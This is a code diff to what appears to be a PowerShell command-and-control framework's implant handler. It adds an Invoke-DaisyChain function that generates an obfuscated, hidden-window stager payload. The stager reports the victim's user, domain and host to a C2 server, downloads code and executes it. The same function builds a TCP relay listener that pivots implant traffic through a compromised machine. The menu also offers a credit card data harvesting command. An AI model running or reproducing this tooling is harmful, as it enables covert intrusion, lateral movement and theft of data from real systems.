@@ -131,6 +131,7 @@ function Implant-Handler
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
         write-host " StartAnotherImplant" -ForegroundColor Green 
         write-host " StartAnotherImplantWithProxy" -ForegroundColor Green 
+        write-host " Invoke-DaisyChain -port 4444 -daisyserver" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfix|Where-Object {$_.Installedon -gt ((Get-Date).Adddays(-2))}|Select-Object -Property Computername, KBArticle,InstalledOn, HotFixID, InstalledBy|ft -autosize" -ForegroundColor Green 
         write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
@@ -242,7 +243,7 @@ if ($pm) {$pm| iex} else {
 start-sleep 10
 primer | iex }'
 
-    function Get-RandomURI 
+        function Get-RandomURI 
     {
         param (
             [int]$Length
@@ -333,6 +334,177 @@ primer | iex }'
         Write-Host -Object "Payload written to: $FolderPath\payloads\proxypayload.bat"  -ForegroundColor Green
         Write-Host -Object "Payload written to: C:\Temp\PowershellC2\Modules\proxypayload.ps1"  -ForegroundColor Green
     }
+function Invoke-DaisyChain {
+param($port, $daisyserver)
+
+$daisycommand = '$serverhost="'+$daisyserver+'"
+$serverport='+$port+'
+$server="http://"+$serverhost+":"+$serverport
+function Get-Webclient ($Cookie) {
+$wc = New-Object System.Net.WebClient; 
+$wc.UseDefaultCredentials = $true; 
+$wc.Proxy.Credentials = $wc.Credentials;
+if ($cookie) {
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
+} $wc }
+function primer {
+$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
+$p64 = [Convert]::ToBase64String($pre)
+$pm = (Get-Webclient -Cookie $p64).downloadstring("$server/connect")
+$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
+$pm } 
+$pm = primer
+if ($pm) {$pm| iex} else {
+start-sleep 10
+primer | iex }'
+
+
+$fdsf = @"
+function start-scriptblock
+{
+    param(
+        [scriptblock]`$script
+    )
+    &`$scripblock
+}
+
+function Get-WebclientDiasy (`$Cookie) {
+    `$wc = New-Object System.Net.WebClient; 
+    `$wc.UseDefaultCredentials = `$true; 
+    `$wc.Proxy.Credentials = `$wc.Credentials;
+    if (`$cookie) {
+        `$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=`$Cookie")
+    } 
+    `$wc 
+}
+
+
+`$ListPort = $port
+`$serverhost = "http://$daisyserver/"
+`$ListPort = new-object System.Net.IPEndPoint([ipaddress]::any,`$ListPort) 
+`$listener = New-Object System.Net.Sockets.TcpListener(`$ListPort)
+`$listener.Start()
+`$running = `$true
+
+while (`$running){
+    `$tcpclient = `$listener.AcceptTcpClient()
+    `$scripblock = {
+        `$client = `$tcpclient
+         
+        function add-newclient
+        {
+            param(
+                [object]`$client
+            )
+            `$bytes = New-Object System.Byte[] 5520420
+            `$stream = `$client.GetStream()
+                 
+            while ((`$i = `$stream.Read(`$bytes,0,`$bytes.Length)) -ne 0){
+                    `$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+                    `$data = `$EncodedText.GetString(`$bytes,0, `$i)
+
+                    `$data = @(`$data -split '[\r\n]+')
+
+                    foreach (`$line in `$data) {
+                         if (`$line.contains("GET")) {
+                             `$dataget = `$line -replace "GET /",""
+                             `$dataget = `$dataget -replace " HTTP/1.1",""
+                             `$dataget = `$dataget -replace " HTTP/1.0",""
+                             `$dataget = `$dataget -replace "connect","daisy"
+                         }
+                         if (`$line.contains("Cookie")) {
+                            `$cookie = `$line -replace "Cookie: SessionID=",""
+                         }
+                    }
+                    `$url = `$serverhost
+                    `$urlget =  `$serverhost + `$dataget
+
+                    `$getreq = `$EncodedText.GetString(`$bytes,0, 3)
+
+                    if (`$getreq -eq "GET")  {
+                        `$pm = (Get-WebclientDiasy -Cookie `$cookie).DownloadString(`$urlget)
+                    } else
+                    {
+                        `$linenum=0
+                        foreach (`$line in `$data) {
+
+                            if(`$linenum -eq 0){
+                                %{ [regex]::matches(`$line, "(.*)NudsWdidf4reWDnNFUE") } | %{ 
+                                    `$cookie = `$_.Groups[0].Value 
+                                    `$cooklen = `$cookie.length
+                                    `$cookie = `$cookie -replace "NudsWdidf4reWDnNFUE", ''
+                                }
+                            }
+                            `$linenum = `$linenum+1
+                        }
+                        `$bytes = `$bytes[`$cooklen..`$i]
+                        `$t = `$i -`$cooklen
+                        `$t = `$t -1
+                        `$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+                        `$RandomURI = `$EncodedText.GetString(`$bytes,0,15)
+                        `$newbyte = `$bytes[15..`$t]
+                        `$urlpost = `$url + `$RandomURI
+                        `$pm = (Get-WebclientDiasy -Cookie `$cookie).UploadData("`$urlpost", `$newbyte)
+
+                    }
+
+
+                    `$httplen = `$pm.length
+                    `$response = `@"
+HTTP/1.1 200 OK
+Pragma: no-cache
+Content-Length: `$httplen
+Expires: 0
+Server: Microsoft-HTTPAPI/2.0
+CacheControl: no-cache, no-store, must-revalidate
+Connection: close            
+
+`$pm
+`"@
+                    `$sendbytes = ([text.encoding]::ASCII).GetBytes(`$response)
+                    `$stream.Write(`$sendbytes,0,`$sendbytes.Length)
+                    `$stream.Flush() 
+                 
+                 
+                <############################################>
+            }
+             
+            `$client.close()
+            `$stream.close()
+        }
+         
+        add-newclient -client `$client
+    }
+ 
+    try{
+        `$thread = new-object system.threading.thread((start-scriptblock -script `$scripblock))
+        `$thread.Start()
+    }catch{}
+}
+
+"@
+
+$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf )
+$CompressedStream = New-Object IO.MemoryStream
+$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+$DeflateStream.Dispose()
+$CompressedScriptBytes = $CompressedStream.ToArray()
+$CompressedStream.Dispose()
+$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+$NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
+$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
+$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))    
+$startscript = "start-process `"powershell`" -argumentlist `"-exec bypass -Noninteractive -windowstyle hidden -c $NewScript`""
+
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($daisycommand)
+$payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+$payload = $payloadraw -replace "`n", ""
+[IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload.bat", $payload)
+Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload.bat"  -ForegroundColor Green
+
+return $startscript
+}
 
 function Resolve-PathSafe
 {
@@ -715,6 +887,7 @@ param
             {
                 CheckModuleLoaded "Invoke-WinRMSession.ps1" $psrandomuri
             }
+
             if ($pscommand.ToLower().StartsWith('invoke-runaspayload'))
             { 
                 CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
@@ -765,6 +938,11 @@ param
             {
                 $pscommand|Invoke-Expression
                 $pscommand = 'fvdsghfdsyyh'
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-daisychain')) 
+            {
+                $output = Invoke-Expression $pscommand
+                $pscommand = $output
             }
             if ($pscommand.ToLower().StartsWith('createproxypayload')) 
             {
